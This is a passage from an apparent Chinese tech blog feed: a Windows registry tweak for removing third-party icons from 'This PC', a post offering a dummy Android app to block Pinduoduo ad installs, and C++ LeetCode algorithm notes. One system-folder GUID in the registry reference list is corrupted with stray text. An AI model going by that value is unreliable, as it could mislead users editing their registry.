        <content type="html"><![CDATA[<p>删除Win10此电脑里的设备和驱动器中的百度云图标，同样方法还可以删除暴风影音，迅雷等。</p><p>不知从何时起，资源管理器“此电脑(Win10)/这台电脑(Win8/Win8.1)/计算机(Win7)”的“设备和驱动器”中就开始流行被植入一些第三方项目。客观上说，这些项目给经常使用这些软件的用户提供了很大便利。但有些用户则并不需要这种“便利”，因为这些项目之所以能够出现在这种位置，完全是软件自身设置的原因，并非用户有意安排。而且鉴于这种现象越来越普遍，导致某些用户“此电脑”中“设备和驱动器”项目数量十分壮观。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/39253/20200608130032138.png" alt="img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>虽然这些软件的设置中也都有移除这些“入口”的选项，但如果这些项目过多，挨个删除未免太过麻烦。有没有什么办法能够一次性删除所有多余项目呢?答案是肯定的，在注册表中就可以实现。需要提醒各位的是，注册表操作需谨慎，最好提前进行备份，以防止误操作带来的麻烦。</p><p>　　<strong>具体方法如下：</strong></p><p>1、在开始-运行输入regedit后回车</p><p>2、定位到 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\</p><blockquote><p>如果上述的注册表为空，或者无效，则定位到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\</p><p>将不是系统自带的全删掉，<strong>最好右键NameSpace备份一下，以免误删</strong></p><p>其他不在下面列表的可以一个一个删除尝试，但一定要<strong>记得备份</strong></p><p>系统自带的参考：</p><p>{1CF1260C-4DD0-4ebb-811F-33C572699FDE}–音乐<br>{374DE290-123F-4565-9164-39C4925E467B}–下载<br>{3ADDbai-EB32-4cb0-BBD7-DFA0ABB5ACCA}–图片<br>{A0953C92-50DC-43bf-BE83-3742FED03C9C}–视频<br>{A8CDFF1C-4878-43be-B5FD-F8091C1C60D0}–文档<br>{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}–桌面</p><p>{0DB7E03F-FC29-4DC6-9020-FF41B59E513A}–3D对象文件夹</p></blockquote><p>3、删除该位置下的所有值，或者你认为可以删除的值(只留“默认”就可以)</p><blockquote><p>这里是删HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\的内容哈，别整错了。</p></blockquote><p>重新打开“此电脑”后，所有第三方项目应该都被“肃清”了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让手机点到广告的时候不会自动安装拼多多</title>
      <link href="/posts/57274/"/>
      <url>/posts/57274/</url>
      
        <content type="html"><![CDATA[<p>今天真的很烦，打开某app，就会马上跳转到应用商店自动下载拼多多。于是乎我直接做了一个和拼多多包名一样的app，这样误点到广告的时候就不会自动安装拼多多了。原理非常简单，大佬勿喷，我不是专门做安卓的</p><p>当然有需要的童鞋也可以点下面的链接下载，没有申请任何权限，很干净。</p><p>蓝奏云下载 <a href="https://link.zhihu.com/?target=https://www.lanzoux.com/iZbxPgnlf3i">https://www.lanzoux.com/iZbxPgnlf3i</a></p><p>或者百度云链接：<a href="https://link.zhihu.com/?target=https://pan.baidu.com/s/17Rbrn9AXGf5knsWSZZzqqg">https://pan.baidu.com/s/17Rbrn9AXGf5knsWSZZzqqg</a></p><p>提取码：g77c</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法与数据结构学习笔记：二分法</title>
      <link href="/posts/59351/"/>
      <url>/posts/59351/</url>
      
        <content type="html"><![CDATA[<h1 id="二分搜索模板"><a href="#二分搜索模板" class="headerlink" title="二分搜索模板"></a>二分搜索模板</h1><p>给一个<strong>有序数组</strong>和目标值，找第一次/最后一次/任何一次出现的索引，如果没有出现返回-1</p><p>模板四点要素</p><ul><li>1、初始化：start=0、end=len-1</li><li>2、循环退出条件：start + 1 &lt; end</li><li>3、比较中点和目标值：A[mid] ==、 &lt;、&gt; target</li><li>4、判断最后两个元素是否符合：A[start]、A[end] ? target</li></ul><p>注意：为了防止overflow，超过int范围，左中位数（a+b)=a+(b-a)/2,右中位数（a+b)=a+(b-a+1)/2如果有mid*mid,mid用int注意溢出</p><p>时间复杂度 O(logn)，使用场景一般是有序数组的查找</p><p>典型示例</p><h4 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search/">704. 二分查找</a></h4><blockquote><p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>{</span><br><span class="line">        <span class="type">int</span> start,mid,end;</span><br><span class="line">        start=<span class="number">0</span>;</span><br><span class="line">        end=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(start&lt;=end)</span><br><span class="line">        {</span><br><span class="line">            mid=start+(end-start)/<span class="number">2</span>;<span class="comment">//防止两数之和超过int范围</span></span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]&gt;target)</span><br><span class="line">            {</span><br><span class="line">                end=mid<span class="number">-1</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span>{</span><br><span class="line">                start=mid<span class="number">+1</span>;</span><br><span class="line">            }</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>大部分二分查找类的题目都可以用这个模板，然后做一点特殊逻辑即可</p><p>另外二分查找还有一些其他模板如下文，大部分场景模板#3 都能解决问题，而且还能找第一次/最后一次出现的位置，应用更加广泛</p><p>所以用模板#3 就对了</p><p><strong>模板 #1 (left &lt;= right)</strong></p><p>二分查找的最基础和最基本的形式。<br>查找条件可以在不与元素的两侧进行比较的情况下确定（或使用它周围的特定元素）。<br>不需要后处理，因为每一步中，你都在检查是否找到了元素。如果到达末尾，则知道未找到该元素。</p><p><strong>模板 #2 (left &lt; right)</strong></p><p>一种实现二分查找的高级方法。<br>查找条件需要访问元素的直接右邻居。<br>使用元素的右邻居来确定是否满足条件，并决定是向左还是向右。<br>保证查找空间在每一步中至少有 2 个元素。<br>需要进行后处理。 当你剩下 1 个元素时，循环 / 递归结束。 需要评估剩余元素是否符合条件。</p><p><strong>模板 #3 (left + 1 &lt; right)</strong></p><p>实现二分查找的另一种方法。<br>搜索条件需要访问元素的直接左右邻居。<br>使用元素的邻居来确定它是向右还是向左。<br>保证查找空间在每个步骤中至少有 3 个元素。<br>需要进行后处理。 当剩下 2 个元素时，循环 / 递归结束。 需要评估其余元素是否符合条件。</p><p>如果是最简单的二分搜索，不需要找第一个、最后一个位置、或者是没有重复元素，可以使用模板#1，代码更简洁</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>二分搜索核心四点要素（必背&amp;理解）</p><ul><li>1、初始化：start=0、end=len-1</li><li>2、循环退出条件：start + 1 &lt; end</li><li>3、比较中点和目标值：A[mid] ==、 &lt;、&gt; target</li><li>4、判断最后两个元素是否符合：A[start]、A[end] ? target</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 二分法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法与数据结构学习笔记：动态规划</title>
      <link href="/posts/26904/"/>
      <url>/posts/26904/</url>
      
        <content type="html"><![CDATA[<h2 id="线性-DP"><a href="#线性-DP" class="headerlink" title="线性 DP"></a>线性 DP</h2><h3 id="最经典单串"><a href="#最经典单串" class="headerlink" title="最经典单串"></a>最经典单串</h3><h4 id="300-最长上升子序列"><a href="#300-最长上升子序列" class="headerlink" title="300. 最长上升子序列"></a><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/">300. 最长上升子序列</a></h4><blockquote><p>给定一个无序的整数数组，找到其中最长上升子序列的长度。</p><p>示例:</p><p>输入: [10,9,2,5,3,7,101,18]<br>输出: 4<br>解释: 最长的上升子序列是 [2,3,7,101]，它的长度是 4。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>{</span><br><span class="line">        <span class="type">int</span> maxLength=<span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(nums.size(),<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&gt;nums[j]&amp;&amp;dp[i]&lt;(dp[j]<span class="number">+1</span>))</span><br><span class="line">                {</span><br><span class="line">                    dp[i]=dp[j]<span class="number">+1</span>;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            maxLength=<span class="built_in">max</span>(maxLength,dp[i]);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> maxLength;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="最经典双串："><a href="#最经典双串：" class="headerlink" title="最经典双串："></a>最经典双串：</h3><h4 id="1143-最长公共子序列"><a href="#1143-最长公共子序列" class="headerlink" title="1143. 最长公共子序列"></a><a href="https://leetcode-cn.com/problems/longest-common-subsequence/">1143. 最长公共子序列</a></h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>{</span><br><span class="line">        <span class="type">int</span> len1=text<span class="number">1.</span><span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> len2=text<span class="number">2.</span><span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> dp[len1<span class="number">+2</span>][len2<span class="number">+2</span>];</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in">sizeof</span>(dp));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=len1;i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=len2;j++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span>(text1[i<span class="number">-1</span>]==text2[j<span class="number">-1</span>])</span><br><span class="line">                {</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]<span class="number">+1</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                {</span><br><span class="line">                    dp[i][j]=<span class="built_in">max</span>(dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j]);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dp[len1][len2];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="经典问题："><a href="#经典问题：" class="headerlink" title="经典问题："></a>经典问题：</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法与数据结构学习笔记：栈和队列</title>
      <link href="/posts/51468/"/>
      <url>/posts/51468/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>栈的特点是后入先出，根据这个特点可以临时保存一些数据，之后用到依次再弹出来，常用于 DFS 深度搜索</p><p>队列一般常用于 BFS 广度搜索，类似一层一层的搜索</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h4 id="155-最小栈"><a href="#155-最小栈" class="headerlink" title="155. 最小栈"></a><a href="https://leetcode-cn.com/problems/min-stack/">155. 最小栈</a></h4><blockquote><p>设计一个支持 push ，pop ，top 操作，并能在常数时间内检索到最小元素的栈。</p><p>push(x) —— 将元素 x 推入栈中。<br>pop() —— 删除栈顶的元素。<br>top() —— 获取栈顶元素。<br>getMin() —— 检索栈中的最小元素。</p></blockquote><h6 id="辅助栈"><a href="#辅助栈" class="headerlink" title="辅助栈"></a>辅助栈</h6><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; minStack;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; dataStack;</span><br><span class="line">    <span class="built_in">MinStack</span>() {</span><br><span class="line">       minStack.<span class="built_in">push</span>(INT_MAX);</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">        dataStack.<span class="built_in">push</span>(x);</span><br><span class="line">        minStack.<span class="built_in">push</span>(<span class="built_in">min</span>(minStack.<span class="built_in">top</span>(),x));</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>{</span><br><span class="line">        minStack.<span class="built_in">pop</span>();</span><br><span class="line">        dataStack.<span class="built_in">pop</span>();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> dataStack.<span class="built_in">top</span>();</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> minStack.<span class="built_in">top</span>();</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack* obj = new MinStack();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;top();</span></span><br><span class="line"><span class="comment"> * int param_4 = obj-&gt;getMin();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure><h4 id="150-逆波兰表达式求值"><a href="#150-逆波兰表达式求值" class="headerlink" title="150. 逆波兰表达式求值"></a><a href="https://leetcode-cn.com/problems/evaluate-reverse-polish-notation/">150. 逆波兰表达式求值</a></h4><blockquote><p>根据<a href="https://baike.baidu.com/item/%E9%80%86%E6%B3%A2%E5%85%B0%E5%BC%8F/128437"> 逆波兰表示法</a>，求表达式的值。</p><p>有效的运算符包括 <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code> 。每个运算对象可以是整数，也可以是另一个逆波兰表达式。</p></blockquote><p>思路：通过栈保存原来的元素，遇到表达式弹出运算，再推入结果，重复这个过程</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">evalRPN</span><span class="params">(vector&lt;string&gt;&amp; tokens)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(tokens.<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tokens.<span class="built_in">size</span>();i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(tokens[i]==<span class="string">"+"</span>||tokens[i]==<span class="string">"-"</span>||tokens[i]==<span class="string">"*"</span>||tokens[i]==<span class="string">"/"</span>)</span><br><span class="line">                {</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">if</span>(st.<span class="built_in">size</span>()&lt;<span class="number">2</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                    <span class="keyword">auto</span> b=st.<span class="built_in">top</span>();</span><br><span class="line">                    st.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="keyword">auto</span> a=st.<span class="built_in">top</span>();</span><br><span class="line">                    st.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="type">int</span> res;</span><br><span class="line">                    <span class="keyword">switch</span>(tokens[i][<span class="number">0</span>])</span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">                            res=a+b;                           </span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">                            res=a-b;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">                            res=a*b;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">                            res=a/b;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    }</span><br><span class="line">                    st.<span class="built_in">push</span>(res);</span><br><span class="line">                }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                st.<span class="built_in">push</span>(<span class="built_in">atoi</span>(tokens[i].<span class="built_in">c_str</span>()));</span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> st.<span class="built_in">top</span>();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="394-字符串解码"><a href="#394-字符串解码" class="headerlink" title="394. 字符串解码"></a><a href="https://leetcode-cn.com/problems/decode-string/">394. 字符串解码</a></h4><blockquote><p>给定一个经过编码的字符串，返回它解码后的字符串。</p><p>编码规则为: k[encoded_string]，表示其中方括号内部的 encoded_string 正好重复 k 次。注意 k 保证为正整数。</p><p>你可以认为输入字符串总是有效的；输入字符串中没有额外的空格，且输入的方括号总是符合格式要求的。</p><p>此外，你可以认为原始数据不包含数字，所有的数字只表示重复的次数 k ，例如不会出现像 3a 或 2[4] 的输入。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">decodeString</span><span class="params">(string s)</span> </span>{</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        stack&lt;string&gt; strs;</span><br><span class="line">        string res=<span class="string">""</span>;</span><br><span class="line">        <span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="type">char</span> ch=s[i];</span><br><span class="line">            <span class="keyword">if</span>(ch&gt;=<span class="string">'0'</span>&amp;&amp;ch&lt;=<span class="string">'9'</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="comment">//多位数情况处理</span></span><br><span class="line">                num=num*<span class="number">10</span>+ch-<span class="string">'0'</span>;</span><br><span class="line"></span><br><span class="line">            }<span class="keyword">else</span> <span class="keyword">if</span>((ch &gt;= <span class="string">'a'</span> &amp;&amp; ch &lt;= <span class="string">'z'</span>) ||(ch &gt;= <span class="string">'A'</span> &amp;&amp; ch &lt;= <span class="string">'Z'</span>))</span><br><span class="line">            {</span><br><span class="line">                res+=ch;</span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">'['</span>)</span><br><span class="line">            {</span><br><span class="line">                nums.<span class="built_in">push</span>(num);</span><br><span class="line">                num=<span class="number">0</span>;</span><br><span class="line">                strs.<span class="built_in">push</span>(res);</span><br><span class="line">                res=<span class="string">""</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="type">int</span> j=nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">while</span>(j--)</span><br><span class="line">                {</span><br><span class="line">                    strs.<span class="built_in">top</span>()+=res;</span><br><span class="line">                }</span><br><span class="line">                res=strs.<span class="built_in">top</span>();</span><br><span class="line">                <span class="comment">//之后若还是字母，就会直接加到res之后，因为它们是同一级的运算</span></span><br><span class="line">                <span class="comment">//若是左括号，res会被压入strs栈，作为上一层的运算</span></span><br><span class="line">                strs.<span class="built_in">pop</span>();</span><br><span class="line">            }</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94. 二叉树的中序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">94. 二叉树的中序遍历</a></h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:   </span><br><span class="line">   </span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;ans;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;       </span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        <span class="keyword">auto</span> cur=root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>||!st.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>)</span><br><span class="line">            